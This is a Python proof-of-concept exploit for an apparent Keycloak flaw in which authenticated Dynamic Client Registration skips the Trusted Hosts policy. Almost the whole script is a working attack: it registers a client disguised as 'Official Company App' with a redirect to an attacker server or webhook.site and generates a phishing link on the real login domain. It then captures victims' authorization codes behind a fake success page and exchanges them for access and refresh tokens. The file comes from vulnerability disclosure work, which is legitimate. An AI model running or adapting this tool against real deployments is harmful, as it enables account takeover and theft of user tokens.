#!/usr/bin/env python3
"""
Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack + Token Theft
Severity: HIGH (CVSS 8.0)
Target: Keycloak 26.5.4

Realistic remote attacker PoC — runs from ANY machine, no admin access needed.
Prerequisites: run setup_f5_admin.py once on the KC server to prepare users/roles.

Attack flow:
1. Login as testuser (public endpoint — no admin needed)
2. Register malicious client via authenticated DCR (redirect → attacker's server)
3. Control check — anonymous DCR should be blocked
4. Start phishing server on attacker machine (or use webhook.site)
5. Generate phishing URL (real Keycloak domain)
6. Wait for victim to click & login
7. Exchange captured auth code for victim's tokens
8. Verify access to victim data

Usage:
  # With local listener (attacker has public IP):
  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host ATTACKER_IP

  # With webhook.site (attacker has no public IP):
  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --use-webhook

  # Automated testing (simulate victim login):
  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host TARGET_IP --auto-victim
"""

import http.client
import http.server
import json
import base64
import argparse
import sys
import re
import socket
import ssl
import time
import threading
import urllib.parse

# ═══ ANSI Colors ═══
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# ═══ Global: store captured auth code ═══
captured_code = None
captured_event = threading.Event()


def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #5: DCR Trusted Hosts Bypass                        ║
║  Live Phishing Attack — Automated Token Theft                ║
║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def step(n, msg):
    print(f"\n{BOLD}{CYAN}[Step {n}]{RESET} {BOLD}{msg}{RESET}")


def success(msg):
    print(f"  {GREEN}[+]{RESET} {msg}")


def fail(msg):
    print(f"  {RED}[-]{RESET} {msg}")


def info(msg):
    print(f"  {BLUE}[*]{RESET} {msg}")


def warn(msg):
    print(f"  {YELLOW}[!]{RESET} {msg}")


# ═══ HTTP Helpers ═══

def http_post_form(host, port, path, data, token=None):
    """POST form-urlencoded, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = urllib.parse.urlencode(data) if isinstance(data, dict) else data
    conn.request("POST", path, body, headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_post_json(host, port, path, data, token=None):
    """POST JSON, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_get_json(host, port, path, token=None):
    """GET JSON, return (status, dict/list)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def decode_jwt(token):
    """Decode JWT payload without verification"""
    payload = token.split(".")[1]
    payload += "=" * (4 - len(payload) % 4)
    return json.loads(base64.b64decode(payload))


# ═══ Webhook.site Helpers ═══

def https_request(method, host, path, body=None, headers=None, timeout=15):
    """Make HTTPS request, return (status, response_body_str)."""
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    return status, raw


def webhook_create_token():
    """Create a new webhook.site token. Returns (uuid, full_url) or (None, None)."""
    status, raw = https_request("POST", "webhook.site", "/token",
        body="", headers={"Content-Type": "application/json"})
    if status == 201 or status == 200:
        try:
            data = json.loads(raw)
            uuid = data.get("uuid", "")
            if uuid:
                return uuid, f"https://webhook.site/{uuid}"
        except json.JSONDecodeError:
            pass
    return None, None


def webhook_poll_for_code(uuid, timeout=300):
    """Poll webhook.site for a request containing an auth code. Returns code or None."""
    start = time.time()
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    idx = 0
    while time.time() - start < timeout:
        elapsed = int(time.time() - start)
        print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
              f"Polling webhook.site for victim callback... ({elapsed}s / {timeout}s)",
              end="", flush=True)
        idx += 1

        try:
            status, raw = https_request("GET", "webhook.site",
                f"/token/{uuid}/requests?sorting=newest&per_page=5")
            if status == 200:
                data = json.loads(raw)
                requests_list = data.get("data", [])
                for req in requests_list:
                    query = req.get("query", {})
                    if "code" in query:
                        code = query["code"]
                        if isinstance(code, list):
                            code = code[0]
                        print("\r" + " " * 80 + "\r", end="")
                        return code
                    # Also check the URL string
                    url = req.get("url", "")
                    if "code=" in url:
                        parsed = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                        if "code" in parsed:
                            print("\r" + " " * 80 + "\r", end="")
                            return parsed["code"][0]
        except Exception:
            pass

        time.sleep(3)

    print("\r" + " " * 80 + "\r", end="")
    return None


# ═══ Phishing Server (Captures Auth Code from Victim) ═══

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that captures auth code from Keycloak redirect."""

    def do_GET(self):
        global captured_code
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)

        if "code" in params:
            captured_code = params["code"][0]

            # Show fake "success" page to victim
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Login Successful</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         text-align: center; padding: 60px 20px; background: #f0f2f5; color: #333; }
  .card { background: #fff; padding: 48px; border-radius: 12px; max-width: 420px;
          margin: 0 auto; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
  .icon { font-size: 72px; color: #4CAF50; margin-bottom: 16px; }
  h2 { margin: 0 0 8px; font-size: 24px; }
  p { color: #666; margin: 4px 0; font-size: 15px; }
  .small { color: #aaa; font-size: 12px; margin-top: 24px; }
</style></head><body>
<div class="card">
  <div class="icon">&#10004;</div>
  <h2>Login Successful!</h2>
  <p>You have been successfully signed in.</p>
  <p class="small">You may close this page.</p>
</div></body></html>"""
            self.wfile.write(html.encode())

            # Notify attacker terminal
            print(f"\n  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}{BOLD}  *** VICTIM AUTH CODE CAPTURED! ***{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}  Code: {captured_code[:50]}...{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")

            captured_event.set()
        else:
            # Other requests (favicon, etc.)
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body>Loading...</body></html>")

    def log_message(self, format, *args):
        pass  # Suppress default logging


def start_phishing_server(port):
    """Start HTTP server on background thread."""
    class ReusableServer(http.server.HTTPServer):
        allow_reuse_address = True
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()

    server = ReusableServer(("0.0.0.0", port), PhishingHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ═══ Auto-Victim Simulation ═══

def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri, listen_port):
    """Automatically simulate victim login (for --auto-victim mode)."""
    time.sleep(2)

    try:
        auth_path = (
            f"/realms/{realm}/protocol/openid-connect/auth"
            f"?client_id={client_id}&response_type=code"
            f"&redirect_uri={urllib.parse.quote(redirect_uri, safe='')}"
            f"&scope=openid+profile+email"
        )

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("GET", auth_path)
        resp = conn.getresponse()
        body = resp.read().decode()
        cookies_raw = [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]
        location = resp.getheader("Location", "")
        status = resp.status
        conn.close()

        cookies = {}
        for c in cookies_raw:
            part = c.split(";")[0]
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k] = v

        while status in (302, 303) and location:
            if location.startswith("http"):
                loc_parsed = urllib.parse.urlparse(location)
                loc_path = loc_parsed.path + ("?" + loc_parsed.query if loc_parsed.query else "")
            else:
                loc_path = location

            conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
            conn.request("GET", loc_path, headers={"Cookie": cookie_str} if cookie_str else {})
            resp = conn.getresponse()
            body = resp.read().decode()
            for c in [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]:
                part = c.split(";")[0]
                if "=" in part:
                    k, v = part.split("=", 1)
                    cookies[k] = v
            location = resp.getheader("Location", "")
            status = resp.status
            conn.close()

        action_match = re.search(r'action="([^"]+)"', body)
        if not action_match:
            return

        action_url = action_match.group(1).replace("&amp;", "&")
        if action_url.startswith("http"):
            action_parsed = urllib.parse.urlparse(action_url)
            action_path = action_parsed.path + ("?" + action_parsed.query if action_parsed.query else "")
        else:
            action_path = action_url

        login_body = "username=victim&password=Password123&credentialId="
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("POST", action_path, login_body, {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookie_str
        })
        resp = conn.getresponse()
        resp.read()
        redirect_location = resp.getheader("Location", "")
        conn.close()

        if redirect_location and str(listen_port) in redirect_location:
            redir_parsed = urllib.parse.urlparse(redirect_location)
            redir_host = redir_parsed.hostname
            redir_port = redir_parsed.port

            # For auto-victim, connect to localhost if the redirect points to
            # the same machine (common in automated testing)
            try:
                conn = http.client.HTTPConnection(redir_host, redir_port, timeout=10)
                conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
                conn.getresponse().read()
                conn.close()
            except Exception:
                # If the attacker-host IP isn't reachable, try localhost
                try:
                    conn = http.client.HTTPConnection("127.0.0.1", redir_port, timeout=10)
                    conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
                    conn.getresponse().read()
                    conn.close()
                except Exception:
                    pass

    except Exception:
        pass


# ═══ Main ═══

def main():
    parser = argparse.ArgumentParser(
        description="PoC Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack (Remote Attacker)")
    parser.add_argument("--host", required=True,
                        help="Keycloak public URL (e.g. http://46.101.162.187:8080)")
    parser.add_argument("--attacker-host", default=None,
                        help="Attacker's public IP/hostname for callback listener")
    parser.add_argument("--listen-port", type=int, default=48888,
                        help="Port for attacker phishing server (default: 48888)")
    parser.add_argument("--realm", default="test",
                        help="Target realm (default: test)")
    parser.add_argument("--timeout", type=int, default=300,
                        help="Timeout waiting for victim in seconds (default: 300)")
    parser.add_argument("--auto-victim", action="store_true",
                        help="Automatically simulate victim login (for testing/CI)")
    parser.add_argument("--use-webhook", action="store_true",
                        help="Use webhook.site as callback (no public IP needed)")
    args = parser.parse_args()

    # Validate args
    if not args.attacker_host and not args.use_webhook:
        fail("Must specify either --attacker-host <IP> or --use-webhook")
        print(f"\n  {YELLOW}Examples:{RESET}")
        print(f"    python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host YOUR_IP")
        print(f"    python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --use-webhook")
        return 1

    if args.attacker_host and args.use_webhook:
        warn("Both --attacker-host and --use-webhook specified; using webhook mode")
        args.attacker_host = None

    # Parse host
    parsed = urllib.parse.urlparse(args.host)
    kc_host = parsed.hostname
    kc_port = parsed.port or 8080
    listen_port = args.listen_port
    realm = args.realm
    use_webhook = args.use_webhook
    results = []

    # Determine callback URL
    webhook_uuid = None
    if use_webhook:
        callback_url = None  # Will be set after creating webhook token
    else:
        callback_url = f"http://{args.attacker_host}:{listen_port}/callback"

    banner()
    info(f"Target Keycloak  : {kc_host}:{kc_port}")
    if use_webhook:
        info(f"Callback mode    : webhook.site (no public IP needed)")
    else:
        info(f"Attacker server  : {args.attacker_host}:{listen_port}")
    info(f"Victim timeout   : {args.timeout}s")

    # ══════════════════════════════════════════════════════════════
    # STEP 1: Attacker login (public endpoint — no admin needed)
    # ══════════════════════════════════════════════════════════════
    step(1, "ATTACKER — Login as testuser (has create-client role)")

    status, data = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": "webapp", "grant_type": "password",
         "username": "testuser", "password": "Password123", "scope": "openid"})

    attacker_token = data.get("access_token", "")
    if not attacker_token:
        fail(f"Login failed: {data}")
        fail("Ensure setup_f5_admin.py has been run first!")
        return 1
    success(f"Login successful — token: {attacker_token[:40]}...")

    # ══════════════════════════════════════════════════════════════
    # STEP 2: Set up callback endpoint
    # ══════════════════════════════════════════════════════════════
    if use_webhook:
        step(2, "ATTACKER — Create webhook.site callback endpoint")
        info("Creating webhook.site token...")
        webhook_uuid, callback_url = webhook_create_token()
        if not webhook_uuid:
            fail("Failed to create webhook.site token!")
            fail("webhook.site may be down or rate-limiting. Try --attacker-host instead.")
            return 1
        success(f"Webhook token: {webhook_uuid}")
        info(f"Callback URL: {callback_url}")
    else:
        step(2, "ATTACKER — Prepare callback endpoint")
        info(f"Callback URL: {callback_url}")

    # ══════════════════════════════════════════════════════════════
    # STEP 3: Register malicious client via authenticated DCR
    # ══════════════════════════════════════════════════════════════
    step(3, "ATTACKER — Register malicious client via Dynamic Client Registration")

    info(f"Redirect URI to attacker server: {callback_url}")

    dcr_data = {
        "client_name": "Official Company App",
        "redirect_uris": [callback_url],
        "grant_types": ["authorization_code", "refresh_token"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "client_secret_basic"
    }

    status, reg_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        dcr_data, attacker_token)

    if "client_id" not in reg_resp:
        fail(f"DCR failed (HTTP {status}): {reg_resp}")
        return 1

    mal_client_id = reg_resp["client_id"]
    mal_secret = reg_resp.get("client_secret", "")

    success("Malicious client REGISTERED successfully!")
    print(f"    {MAGENTA}Client ID     : {mal_client_id}{RESET}")
    print(f"    {MAGENTA}Client Secret : {mal_secret}{RESET}")
    print(f"    {MAGENTA}Redirect URI  : {callback_url}{RESET}")
    print(f"    {MAGENTA}Client Name   : Official Company App{RESET}")
    warn("Trusted Hosts policy NOT enforced for authenticated DCR!")
    results.append(("DCR bypass (malicious client registered)", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 4: Control — Anonymous DCR should be blocked
    # ══════════════════════════════════════════════════════════════
    step(4, "CONTROL — Anonymous DCR (no authentication)")

    status, anon_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        {"client_name": "anon-test", "redirect_uris": [callback_url]})

    anon_desc = anon_resp.get("error_description", anon_resp.get("error", str(anon_resp)))
    if status == 403 or "Trusted Hosts" in str(anon_resp):
        success(f"Anonymous DCR BLOCKED (correct): {anon_desc[:80]}")
        results.append(("Control: Anonymous DCR blocked", True))
    else:
        warn(f"Anonymous DCR not blocked (HTTP {status})")
        results.append(("Control: Anonymous DCR blocked", False))

    info("Policy gap confirmed: Anonymous=BLOCKED, Authenticated=ALLOWED")

    # ══════════════════════════════════════════════════════════════
    # STEP 5: Start phishing server / prepare webhook listener
    # ══════════════════════════════════════════════════════════════
    server = None
    if not use_webhook:
        step(5, "ATTACKER — Start phishing server (auth code catcher)")
        server = start_phishing_server(listen_port)
        success(f"Phishing server active on 0.0.0.0:{listen_port}")
        info("Server will capture auth code when victim is redirected here")
    else:
        step(5, "ATTACKER — Webhook.site ready to capture callback")
        success(f"webhook.site will capture auth code at: {callback_url}")
        info("No local server needed — webhook.site handles the redirect")

    # ══════════════════════════════════════════════════════════════
    # STEP 6: Generate phishing URL
    # ══════════════════════════════════════════════════════════════
    step(6, "ATTACKER — Generate phishing URL")

    phishing_url = (
        f"http://{kc_host}:{kc_port}/realms/{realm}/protocol/openid-connect/auth"
        f"?client_id={mal_client_id}"
        f"&response_type=code"
        f"&redirect_uri={urllib.parse.quote(callback_url, safe='')}"
        f"&scope=openid+profile+email"
    )

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║              PHISHING URL READY TO SEND                      ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

  {BOLD}{WHITE}Send this URL to the target victim:{RESET}

  {CYAN}{BOLD}{phishing_url}{RESET}

  {YELLOW}> This URL looks 100% legitimate (real Keycloak domain)
  > Victim will see the real Keycloak login page
  > After login, auth code is automatically sent to our server
  > Victim sees a fake "Login Successful" page{RESET}

  {BOLD}Waiting for victim to click the URL and log in...{RESET}
  {DIM}(Open the URL above in a browser to simulate victim){RESET}
  {DIM}Timeout: {args.timeout}s{RESET}
""")

    # ══════════════════════════════════════════════════════════════
    # STEP 7: Wait for victim
    # ══════════════════════════════════════════════════════════════
    step(7, f"Waiting for victim to log in... (timeout {args.timeout}s)")

    if args.auto_victim:
        info("--auto-victim mode: automatically simulating victim login...")
        victim_thread = threading.Thread(
            target=simulate_victim_login,
            args=(kc_host, kc_port, realm, mal_client_id, callback_url, listen_port),
            daemon=True)
        victim_thread.start()

    if use_webhook:
        # Poll webhook.site for the captured auth code
        code = webhook_poll_for_code(webhook_uuid, args.timeout)
        if code:
            captured_code_local = code
        else:
            captured_code_local = None
    else:
        # Wait for local phishing server to capture the code
        start_time = time.time()
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        idx = 0
        while not captured_event.is_set():
            elapsed = int(time.time() - start_time)
            remaining = args.timeout - elapsed
            if remaining <= 0:
                break
            print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
                  f"Waiting for victim... ({elapsed}s / {args.timeout}s) "
                  f"— Open URL in browser to simulate", end="", flush=True)
            idx += 1
            captured_event.wait(timeout=0.3)

        print("\r" + " " * 80 + "\r", end="")  # Clear spinner line
        captured_code_local = captured_code

    if not captured_code_local:
        fail(f"Timeout — no victim logged in within {args.timeout} seconds")
        print(f"\n  {YELLOW}Tip: Open the phishing URL in a browser, login as victim/Password123{RESET}")
        if server:
            server.shutdown()
        print_summary(results)
        return 1

    success("Victim auth code captured!")
    info(f"Auth code: {captured_code_local[:50]}...")
    results.append(("Auth code captured via redirect", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 8: Exchange auth code for victim tokens
    # ══════════════════════════════════════════════════════════════
    step(8, "ATTACKER — Exchange stolen auth code for victim tokens")

    status, token_resp = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": mal_client_id,
         "client_secret": mal_secret,
         "grant_type": "authorization_code",
         "code": captured_code_local,
         "redirect_uri": callback_url})

    if "access_token" not in token_resp:
        fail(f"Token exchange failed: {token_resp}")
        if server:
            server.shutdown()
        print_summary(results)
        return 1

    claims = decode_jwt(token_resp["access_token"])

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

    {BOLD}Username     :{RESET} {RED}{claims.get('preferred_username', 'N/A')}{RESET}
    {BOLD}Email        :{RESET} {RED}{claims.get('email', 'N/A')}{RESET}
    {BOLD}Full Name    :{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
    {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
    {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token'][:60]}...{RESET}
    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')[:60]}...{RESET}

  {YELLOW}{BOLD}Attacker now has full access to victim's account!{RESET}
""")
    results.append(("Victim token stolen", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 9: Verify — access victim data
    # ══════════════════════════════════════════════════════════════
    step(9, "ATTACKER — Verify access to victim data with stolen token")

    status, userinfo = http_get_json(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/userinfo",
        token_resp["access_token"])

    if status == 200:
        success("Victim userinfo accessed successfully:")
        for k, v in userinfo.items():
            if k not in ("sub",):
                print(f"    {k}: {v}")
        results.append(("Victim data access verified", True))
    else:
        warn(f"Userinfo failed (HTTP {status})")
        results.append(("Victim data access verified", False))

    if server:
        server.shutdown()
    print_summary(results)
    return 0


def print_summary(results):
    """Display test results summary."""
    vuln_count = sum(1 for _, v in results if v)

    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                    RESULTS SUMMARY                           ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}SECURE{RESET}"
        print(f"  {name:45s} {status_str}")

    print(f"""
{YELLOW}Attack Impact:{RESET}
  - User with create-client role can steal tokens of ANY realm user
  - Victim sees 100% legitimate Keycloak login page (trusted domain)
  - Stolen refresh token provides persistent access to victim account
  - One malicious client can phish all users in the realm

{YELLOW}Policy Gap:{RESET}
  - Anonymous DCR   : Trusted Hosts ENFORCED (correctly blocks)
  - Authenticated DCR: Trusted Hosts NOT PRESENT (allows any redirect_uri)
  - Admin REST API  : Returns 403 (correctly blocks)

{YELLOW}Root Cause:{RESET}
  The "Trusted Hosts" client registration policy only exists in the
  "anonymous" subType. The "authenticated" subType has no URI
  restriction policy whatsoever.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] VULNERABILITY CONFIRMED — {vuln_count}/{len(results)} tests positive{RESET}")
    else:
        print(f"{GREEN}{BOLD}[+] All tests passed — not vulnerable{RESET}")


if __name__ == "__main__":
    sys.exit(main())
